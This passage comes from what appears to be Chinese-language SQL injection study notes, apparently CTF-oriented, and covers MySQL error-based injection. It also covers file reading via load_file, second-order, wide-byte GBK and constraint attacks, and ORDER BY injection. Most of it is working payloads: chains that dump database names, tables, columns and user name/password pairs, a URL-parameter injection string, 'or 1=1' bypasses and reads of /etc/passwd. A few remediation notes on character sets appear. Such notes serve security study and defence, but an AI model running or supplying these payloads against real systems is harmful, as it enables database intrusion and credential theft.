1，当数据表中最少需要三条数据才会报错</p><p>floor()报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。</p></blockquote><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a;<br>#也可以简化成<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(version(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>));<br>#关键表被过滤时<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">!</span><span class="hljs-number">1</span>) <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(version(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))<br>#rand被过滤 适用用户变量<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">min</span>(<span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(password,<span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span>(<span class="hljs-variable">@a</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>)<span class="hljs-operator">%</span><span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">爆库<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> ( <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x )a;<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.hackblog.cn<span class="hljs-operator">/</span>sql.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">distinct</span><br>concat(<span class="hljs-number">0x7e</span>,schema_name,<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">FROM</span> information_schema.schemata LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.tables limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a)<br>爆表<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span><br>table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a;<br>爆字段<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span><br>table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span>‘users’ limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),’<span class="hljs-operator">|</span>’,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a;<br>爆数据<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> concat(name,’<span class="hljs-operator">|</span>’,passwd,’<span class="hljs-operator">|</span>’,birth) <span class="hljs-keyword">from</span> users limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>),’<span class="hljs-operator">|</span>’,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a;<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> concat(<span class="hljs-number">0x23</span>,name,<span class="hljs-number">0x3a</span>,passwd,<span class="hljs-number">0x23</span>) <span class="hljs-keyword">FROM</span> users limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.tables limit <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a<br></code></pre></td></tr></table></figure><p>几何函数 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">GeometryCollection：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> GeometryCollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span><span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>polygon()：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>multipoint()：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>multilinestring()：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>linestring()：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> LINESTRING((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>multipolygon() ：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br></code></pre></td></tr></table></figure><p>不存在函数</p><blockquote><p>爆数据库</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032231655.jpg" alt="image-20220708181105742"></p></blockquote><p>name_const()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">获取版本信息<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> name_const(version(),<span class="hljs-number">0x1</span>),name_const(version(),<span class="hljs-number">0x1</span>))a;<br># <span class="hljs-number">1060</span> <span class="hljs-operator">-</span> Duplicate <span class="hljs-keyword">column</span> name <span class="hljs-string">&#x27;8.0.27&#x27;</span><br></code></pre></td></tr></table></figure><p>uuid相关函数</p><p>mysql:8.0.x</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span> UUID_TO_BIN((<span class="hljs-keyword">SELECT</span> password <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>));<br># <span class="hljs-number">1146</span> <span class="hljs-operator">-</span> <span class="hljs-keyword">Table</span> <span class="hljs-string">&#x27;test.users&#x27;</span> doesn<span class="hljs-string">&#x27;t exist</span><br><span class="hljs-string">mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</span><br><span class="hljs-string"># 1146 - Table &#x27;</span>test.users<span class="hljs-string">&#x27; doesn&#x27;</span>t exist<br></code></pre></td></tr></table></figure><p>exp() 适用版本 5.5.5-5.5.49</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">USER</span>())a));<br><span class="hljs-comment">--其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函 数内，得到的结果将超过mysql的double数组范围，从而报错输出。除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。</span><br><span class="hljs-comment">--double 数值类型超出范围</span><br><span class="hljs-comment">--Exp()为以e 为底的对数函数；</span><br><br><span class="hljs-comment">--ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;root@localhost&#x27; from dual)))&#x27;</span><br><br>如果是在适用版本之外：虽然也会报错，但是表名不会出来<br><span class="hljs-keyword">select</span> <span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)<span class="hljs-operator">-</span><span class="hljs-operator">~</span><span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><blockquote><p>exp报错<a href="https://www.cnblogs.com/lcamry/articles/5509124.html">（转载）使用exp进行SQL报错注入 - lcamry - 博客园 (cnblogs.com)</a></p></blockquote><p>pow()结合盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> pow(<span class="hljs-number">1</span><span class="hljs-operator">+</span>(表达式),<span class="hljs-number">999999999999</span>)<br># 表达式可以是盲注的形式，返回<span class="hljs-number">1</span>或者<span class="hljs-number">0</span>，通过报错将字符猜出来，报错回显的表达式是返回<span class="hljs-number">1</span>的<br># 同样方式用在exp上(临界值为<span class="hljs-number">709</span>)<br><span class="hljs-built_in">exp</span>(<span class="hljs-number">709</span><span class="hljs-operator">+</span>(表达式))<br></code></pre></td></tr></table></figure><p>bigint 溢出文章<a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x) <span class="hljs-operator">-</span> <span class="hljs-operator">~</span><span class="hljs-number">0</span>),<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="xpath语法错误–较常用"><a href="#xpath语法错误–较常用" class="headerlink" title="xpath语法错误–较常用"></a>xpath语法错误–较常用</h3><p>报错原因，0x7e就是~不属于xpath语法格式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>));<br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br># 适用版本: <span class="hljs-number">5.1</span><span class="hljs-number">.5</span><span class="hljs-operator">+</span><br></code></pre></td></tr></table></figure><blockquote><p>updatexml三个参数</p><ul><li><p>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 1</p></li><li><p>第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。</p></li><li><p>第三个参数：new_value，String 格式，替换查找到的符合条件的数据**</p></li></ul><p>注意加select防止不回显，当显示字符有限时，常用字符串截断substr配合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> NAME_CONST(version(),<span class="hljs-number">1</span>),NAME_CONST(version(),<span class="hljs-number">1</span>))x;<br><span class="hljs-comment">--mysql 重复特性，此处重复了version，所以报错。</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="Join-using-注列名"><a href="#Join-using-注列名" class="headerlink" title="Join using()注列名"></a>Join using()注列名</h3><p>mysql8修复</p><p>报错存在重复的列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)b)c; # 报错信息内回显第一列名称<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)b <span class="hljs-keyword">using</span>(username))c;# 第二列<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)b <span class="hljs-keyword">using</span>(username,password))c;# 第三列<br></code></pre></td></tr></table></figure><h3 id="GTID相关函数"><a href="#GTID相关函数" class="headerlink" title="GTID相关函数"></a>GTID相关函数</h3><p>版本&gt;&#x3D;5.6.5</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gtid_subset(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>); # 报错回显用户<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gtid_subset(hex(substr((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users limit<br><span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>);<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gtid_subtract((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a),<span class="hljs-number">1</span>); # 报错回显用户<br></code></pre></td></tr></table></figure><h2 id="导入导出文件"><a href="#导入导出文件" class="headerlink" title="导入导出文件"></a>导入导出文件</h2><h3 id="查看限制"><a href="#查看限制" class="headerlink" title="查看限制"></a>查看限制</h3><p>secure_file_priv</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232760.jpg" alt="image-20220708190755416"></p><h3 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h3><p>load_file(filename)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232156.jpg" alt="image-20220708190902690"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(load_file(&quot;/etc/passwd&quot;) <span class="hljs-keyword">using</span> utf8);<br></code></pre></td></tr></table></figure><p>详见<a href="https://ccship.cn/2021/10/21/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结 – cc (ccship.cn)</a></p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="常见思路-1"><a href="#常见思路-1" class="headerlink" title="常见思路"></a>常见思路</h3><p>如果是单引号闭合</p><p>注册一个<code>admin&#39;#</code>账户，登录修改其密码，则实际改的是admin的密码</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。</p><p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入。PHP的编码为UTF-8 而MySql的编码设置为了SET NAMES ‘gbk’ 或是SET character_set_client &#x3D;gbk，这样配置会引发编码转换从而导致的注入漏洞。</p><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><ul><li><p><strong>addslashes()</strong> ：这个函数在预定义字符之前添加反斜杠 \ 。预定义字符： 单引号 ‘ 、双引号 ” 、反斜杠 \ 、NULL。但是这个函数有一个特点就是虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。</p><blockquote><p>这个函数功能与魔术引号功能完全相同，如果魔术引号打开就不要用这个函数了</p></blockquote></li><li><p>三个魔术引号功能</p><blockquote><ol><li><p>magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。 参见 get_magic_quotes_gpc()。如果 magic_quotes_gpc 关闭时返回 0，开启时返回 1。在 PHP 5.4.0 起将始终返回 0，因为这个魔术引号功能已经从 PHP 中移除了。</p></li><li><p>magic_quotes_runtime 如果打开的话，大部份从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为 off。 参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。</p></li><li><p>magic_quotes_sybase (魔术引号开关)如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖 magic_quotes_gpc。如果同时打开两个选项的话，单引号将会被转义成 ”。而双引号、反斜线 和 NULL 字符将不会进行转义。</p></li></ol></blockquote></li></ul><h3 id="gbk编码"><a href="#gbk编码" class="headerlink" title="gbk编码"></a>gbk编码</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">用户名输入：admin<span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">转义后为： admin%df\&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<br><span class="hljs-keyword">SET</span> character_set_client <span class="hljs-operator">=</span><span class="hljs-string">&#x27;gbk&#x27;</span>后：admin運<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">执行语句：... where username=&#x27;</span>admin運<span class="hljs-string">&#x27; or 1=1#&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p><code>%df</code>吃掉<code>\</code>的原因是，<code>urlencode(\&#39;)</code>&#x3D;<code>%5c%27</code> ,添加%df后形成<code>%df%5c%27</code>,而上面提到的mysql 在GBK 编码方式的，第一位范围为0x00-0x7F时，当作一个字符。%df不在这个范围内，因此会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27(‘) 则作为一个单独的符号在外面，同时也就达到了我们的目的</p></blockquote><h3 id="utf8编码、Latin1编码"><a href="#utf8编码、Latin1编码" class="headerlink" title="utf8编码、Latin1编码"></a>utf8编码、Latin1编码</h3><p>UTF-8编码是变长编码，可能有1~4个字节表示： </p><ul><li>一字节时范围是<code>[00-7F] </code></li><li>两字节时范围是<code>[C0-DF][80-BF]</code> </li><li>三字节时范围是<code>[E0-EF][80-BF][80-BF]</code> </li><li>四字节时范围是<code>[F0-F7][80-BF][80-BF][80-BF]</code></li></ul><blockquote><p>然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中, 所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">输入：?username<span class="hljs-operator">=</span>admin<span class="hljs-operator">%</span>c2<br><span class="hljs-operator">%</span>c2是Latin1字符集不存在的字符，<span class="hljs-operator">%</span><span class="hljs-number">00</span><span class="hljs-operator">-</span><span class="hljs-operator">%</span><span class="hljs-number">7</span>F可以直接表示某个字符、<span class="hljs-operator">%</span>C2<span class="hljs-operator">-</span><span class="hljs-operator">%</span>F4不可以直接表示某个字符而只是其他长字节编码结果的首字节。对于不完整的长字节UTF<span class="hljs-number">-8</span>编码的字符，进行字符集转换时会直接忽略，所以admin<span class="hljs-operator">%</span>c2会变成admin<br></code></pre></td></tr></table></figure><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul><li><p>在调用 <strong>mysql_real_escape_string()</strong> 函数之前，先设置连接所使用的字符集为GBK ，<strong>mysql_set_charset&#x3D;(‘gbk’,$conn)</strong> 。</p></li><li><p>所以防止宽字节注入的另一个方法就是将 <strong>character_set_client</strong> 设置为binary(二进制)。需要在所有的sql语句前指定连接的形式是binary二进制：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); <br></code></pre></td></tr></table></figure><blockquote><p>当我们的MySQL收到客户端的请求数据后，会认为他的编码是character_set_client所对应的编码，也就是二进制。然后再将它转换成character_set_connection所对应的编码。然后进入具体表和字段后，再转换成字段对应的编码。当查询结果产生后，会从表和字段的编码转换成character_set_results所对应的编码，返回给客户端。所以，当我们将character_set_client编码设置成了binary，就不存在宽字节注入的问题了，所有的数据都是以二进制的形式传递。</p></blockquote></li></ul><h2 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h2><p>当数据库字符串长度过短，并且后端没有对字符串进行长度限制时</p><p>select 语句对于参数后面空格的处理是删除，insert只是截取最大长度的字符串，然后插入数据库。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users(<br>username <span class="hljs-type">varchar</span>(<span class="hljs-number">25</span>),<br>  password <span class="hljs-type">varchar</span>(<span class="hljs-number">25</span>)<br>)<br></code></pre></td></tr></table></figure><p>最大长度限制(具体看表的定义)为25 我们输入用户名为 admin[20个空格]1,密码随意。脚本查询的时候因为用了select 语句，空格被删除，剩下了admin1。</p><p>注册时：INSERT取前25位-&gt;admin[20个空格]和自己设定的密码当成了一个新用户-&gt;select查找admin，返回两条</p><blockquote><p>数据库里面的空格也在查询的时候被删除了再比较</p></blockquote><h2 id="order-by-后的注入"><a href="#order-by-后的注入" class="headerlink" title="order by 后的注入"></a>order by 后的注入</h2><h3 id="order-by参数后注入"><a href="#order-by参数后注入" class="headerlink" title="order by参数后注入"></a>order by参数后注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sort&#x27;</span>];  <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>sort可以是sql语句，只要保证返回一行一列或者是一个数字或布尔类型也可以,一般有以下三种</p><ul><li><p>直接注入语句（要返回单行单列） ?sort&#x3D;(select ……)</p></li><li><p>利用函数rand 